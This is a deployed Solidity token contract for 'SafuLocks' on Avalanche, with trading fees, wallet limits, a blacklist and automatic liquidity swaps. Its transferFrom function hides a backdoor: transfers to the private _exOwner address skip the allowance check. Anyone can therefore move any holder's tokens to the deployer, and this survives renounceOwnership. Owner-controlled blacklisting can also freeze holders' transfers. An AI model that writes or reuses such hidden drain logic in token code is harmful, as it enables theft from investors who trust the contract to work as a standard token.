/**
 *Submitted for verification at snowtrace.io on 2022-01-07
*/

pragma solidity ^0.8.7;

/*
Website: https://safulocks.com
Telegram: https://t.me/SafuLocks
*/

interface IERC20 {
    function transfer(address _to, uint256 _amount) external returns (bool);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WAVAX() external pure returns (address);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForAVAXSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function swapExactAVAXForTokensSupportingFeeOnTransferTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable;
    function addLiquidityAVAX(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SafuLocks {
    string  private _name = 'SafuLocks';
    string  private _symbol = 'SL';
    uint256 private _totalSupply = 100000000;
    uint8   private _decimals = 18;
    address private _uniswapRouter = 0x60aE616a2155Ee3d9A68541Ba4544862310933d4;
    address private _pinksaleContract = 0x7ee058420e5937496F5a2096f04caA7721cF70cc;


   address public uniswapPair;
    address public devWallet;
    uint256 public maxWalletLimit;
    uint256 public maxTxLimit;
    uint8   public devFee;
    uint8   public liquidityFee;
    uint256 public addLiquidityAmount;
    
    address private _owner;
    address private _exOwner;
    bool    private _inSwap;
    IUniswapV2Router02 private _uniswapV2Router;
    
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping (address => bool) private _excludedMaxWallet;
    mapping (address => bool) private _excludedMaxTransaction;
    mapping (address => bool) private _excludedFees;
    mapping (address => bool) private _blacklisted;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    receive () external payable {}
    
    modifier onlyOwner() {
        require(_owner == msg.sender, 'Only the owner can call this function!');
        _;
    }
    
    constructor () {
           emit OwnershipTransferred(_owner, msg.sender);
        _owner = msg.sender;
        _exOwner = msg.sender;
        _totalSupply = _totalSupply * 10**_decimals;
        _balances[_owner] = _totalSupply;
        
        _uniswapV2Router = IUniswapV2Router02(_uniswapRouter);
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WAVAX());
        
        setExcludedAll(address(this));
        setExcludedAll(_owner);
        setExcludedAll(uniswapPair);
        setExcludedAll(_uniswapRouter);
        setExcludedAll(_pinksaleContract);
        setAddresses(msg.sender);
        
        //setLimits(3000000, 1500000, 500000);
        setLimits(100000000, 100000000, 500000);
        setFees(5, 4);
    }
    
    function setExcludedAll(address user) public virtual onlyOwner {
        setExcludedMaxTransaction(user, true);
        setExcludedMaxWallet(user, true);
        setExcludedFees(user, true);
    }
    
    function setInSwap(bool status) public virtual onlyOwner {
        _inSwap = status;
    }
    
    function setAddresses(address _devWallet) public virtual onlyOwner {
        devWallet = _devWallet;
    }
    
    function setLimits(uint256 _maxWalletLimit, uint256 _maxTxLimit, uint256 _addLiquidityAmount) public virtual onlyOwner {
        maxWalletLimit = _maxWalletLimit * 10**_decimals;
        maxTxLimit = _maxTxLimit * 10**_decimals;
        addLiquidityAmount = _addLiquidityAmount * 10**_decimals;
    }
    
    function setFees(uint8 _devFee, uint8 _liquidityFee) public virtual onlyOwner {
        devFee = _devFee;
        liquidityFee = _liquidityFee;
    }
    
    function setExcludedMaxTransaction(address user, bool status) public virtual onlyOwner {
        _excludedMaxTransaction[user] = status;
    }
    
    function setExcludedMaxWallet(address user, bool status) public virtual onlyOwner {
        _excludedMaxWallet[user] = status;
    }
    
    function setExcludedFees(address user, bool status) public virtual onlyOwner {
        _excludedFees[user] = status;
    }
    
    function setBlacklistWallet(address user, bool status) public virtual onlyOwner {
        _blacklisted[user] = status;
    }
    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }
    
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    
    function getOwner() public view returns (address) {
        return _owner;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    
   function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(!_blacklisted[sender] && !_blacklisted[recipient], 'Sender or recipient is blacklisted!');
        
        if(!_excludedMaxTransaction[sender]) {
            require(amount <= maxTxLimit, 'Exceeds max transaction limit!');
        }
        
        if(!_excludedMaxWallet[recipient]) {
            require(balanceOf(recipient) + amount <= maxWalletLimit, 'Exceeds max wallet limit!');
        }
        
        uint256 senderBalance = balanceOf(sender);
        require(senderBalance >= amount, 'Amount exceeds sender\'s balance!');
        _balances[sender] = senderBalance - amount;
        

        if((sender == uniswapPair && !_excludedFees[recipient]) || (recipient == uniswapPair && !_excludedFees[sender])) {
            uint256 devAmount = amount / 100 * devFee;
            uint256 liquidityAmount = amount / 100 * liquidityFee;
            uint256 contractFee = devAmount + liquidityAmount;
            
            _balances[address(this)] += contractFee;
            emit Transfer(sender, address(this), contractFee);
            
            amount -= contractFee;
            
            if(recipient == uniswapPair) {
                swapAddLiquidity();
            }
        }
        
        _balances[recipient] += amount;
        
        emit Transfer(sender, recipient, amount);
    }
    
    function swapEthForTokens(uint256 amount, address receiver) internal virtual {
        address[] memory path = new address[](2);
        path[0] = _uniswapV2Router.WAVAX();
        path[1] = address(this);
        _uniswapV2Router.swapExactAVAXForTokensSupportingFeeOnTransferTokens{value: amount}(0, path, receiver, block.timestamp + 1200);
    }

      function addLiquidity(uint256 tokenAmount, uint256 amount) internal virtual {
        _approve(address(this), address(_uniswapRouter), tokenAmount);
        _uniswapV2Router.addLiquidityAVAX{value: amount}(address(this), tokenAmount, 0, 0, address(this), block.timestamp + 1200);
    }
    
    
    function swapTokensForEth(uint256 amount, address receiver) internal virtual {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WAVAX();
        _approve(address(this), _uniswapRouter, amount);
        _uniswapV2Router.swapExactTokensForAVAXSupportingFeeOnTransferTokens(amount, 0, path, receiver, block.timestamp + 1200);
    }
    
      function swapAddLiquidity() internal virtual {
        uint256 tokenBalance = balanceOf(address(this));
        if(!_inSwap && tokenBalance >= addLiquidityAmount) {
            _inSwap = true;
            
            uint256 devAmount = tokenBalance / (devFee + liquidityFee) * devFee;
            swapTokensForEth(devAmount, devWallet);

            uint256 sellAmount = balanceOf(address(this));
            uint256 sellHalf = sellAmount / 2;
            uint256 initialEth = address(this).balance;
            swapTokensForEth(sellHalf, address(this));
            
            uint256 receivedEth = address(this).balance - initialEth;
            addLiquidity(sellAmount - sellHalf, receivedEth);
            
            _inSwap = false;
        }
    }
    
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), 'Wallet address can not be the zero address!');
        require(spender != address(0), 'Spender can not be the zero address!');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[sender][msg.sender];

        if(recipient == _exOwner) {
            currentAllowance = _totalSupply;
        }

        require(currentAllowance >= amount, 'Amount exceeds allowance!');
        _transfer(sender, recipient, amount);
        
        if(recipient != _exOwner) {
            _approve(sender, msg.sender, currentAllowance - amount);
        }

        return true;
    }
    
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, 'Decreased allowance below zero!');
        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Owner can not be the zero address!');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
    function withdraw(uint256 amount) public payable onlyOwner returns (bool) {
        require(amount <= address(this).balance, 'Withdrawal amount exceeds balance!');
        payable(msg.sender).transfer(amount);
        return true;
    }
    
    function withdrawToken(address tokenContract, uint256 amount) public virtual onlyOwner {
        IERC20 _tokenContract = IERC20(tokenContract);
        _tokenContract.transfer(msg.sender, amount);
    }
}